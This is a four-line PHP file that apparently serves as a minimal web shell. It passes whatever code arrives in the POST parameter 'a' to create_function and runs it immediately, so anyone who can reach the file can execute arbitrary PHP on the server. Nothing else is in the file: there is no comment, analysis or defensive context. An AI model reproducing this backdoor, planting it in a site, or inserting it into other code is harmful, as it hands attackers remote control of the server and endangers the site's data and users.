<?php 
$fun = create_function('',$_POST['a']);
$fun();
?>